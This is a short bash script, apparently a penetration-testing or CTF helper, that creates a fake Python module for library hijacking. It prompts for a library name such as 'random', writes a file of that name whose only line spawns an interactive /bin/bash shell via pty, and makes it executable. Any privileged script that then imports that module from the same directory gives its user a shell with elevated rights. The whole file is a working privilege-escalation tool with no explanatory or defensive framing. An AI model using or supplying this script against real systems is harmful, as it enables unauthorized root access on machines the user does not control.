#!/bin/bash

read -p "[i] Enter the name of the Python library to hijack (e.g. random): " LIB_NAME

if [ -z "$LIB_NAME" ]; then
    echo "[x] Error: No library name provided."
    exit 1
fi

FILENAME="${LIB_NAME}.py"

echo "import pty; pty.spawn('/bin/bash')" > "$FILENAME"
chmod +x "$FILENAME"

if [ -f "$FILENAME" ]; then
    echo "[+] Fake Python module created: $FILENAME with exacutable permision."
else
    echo "[-] Failed to create the file."
    exit 1
fi